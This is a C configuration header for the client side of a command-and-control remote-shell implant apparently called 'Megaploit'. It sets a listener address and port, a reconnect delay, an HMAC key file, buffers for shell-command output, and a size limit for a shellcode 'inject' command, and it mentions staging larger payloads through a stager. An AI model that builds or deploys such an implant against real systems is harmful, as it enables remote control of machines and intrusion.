/*
 * client/config.h  –  Client-side connection configuration
 * ==========================================================
 * All tuneable values for the remote shell client live here.
 * Change these before building; do not scatter magic numbers
 * across source files.
 */

#pragma once
#ifndef CLIENT_CONFIG_H
#define CLIENT_CONFIG_H

/* ── C2 server address ────────────────────────────────────────────────────── */
#define C2_IP      "192.168.1.226"  /* IPv4 address of the Megaploit listener  */ //cannot have hardcoded IP addresses
#define C2_PORT    50005            /* TCP port the listener binds to          */

/* ── Reconnect timing ───────────────────────────────────────────────────── */
/* How many seconds to wait between connection attempts.
 * Matches RECONNECT_DELAY in megaploit/core/config.py                       */
#define RECONNECT_DELAY_SEC   10

/* ── Shared secret key ───────────────────────────────────────────────────── */
/* Path to the key file used for HMAC-SHA256 auth.
 *
 * BUG (comment-only): the previous comment said to write os.urandom(32) raw
 * bytes.  That is WRONG.  load_secret_key() reads 64 ASCII hex characters
 * and hex-decodes them to 32 bytes — the same format megaploit.core.crypto
 * produces via binascii.hexlify(os.urandom(32)).
 *
 * Generate with:
 *   python -c "import os,binascii; \
 *       open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
 *
 * The resulting file contains exactly 64 ASCII hex chars (no newline needed).
 * The same hex file must be loaded by the Megaploit server.                  */
#define SECRET_KEY_PATH  "secret.key"
#define SECRET_KEY_LEN   32         /* decoded binary length (not file size)  */

/* ── Response buffer sizes ───────────────────────────────────────────────── */
#define SHELL_LINE_BUF    4096      /* single fgets() line from _popen        */
#define SHELL_RESP_BUF   65536      /* accumulated command output (64 KB)     */

/* ── Inject / migrate limits ─────────────────────────────────────────────── */
/* Maximum shellcode size accepted by the "inject" verb (32 KB).
 * Larger payloads must be staged: inject a small stager that pulls the
 * full payload over a second channel.                                        */
#define INJECT_MAX_SHELLCODE  (32 * 1024)

/* Maximum number of processes listed by "ps" before output is truncated.
 * Prevents a 10 MB response if something very unusual is running.           */
#define PS_MAX_PROCS          512

#endif /* CLIENT_CONFIG_H */
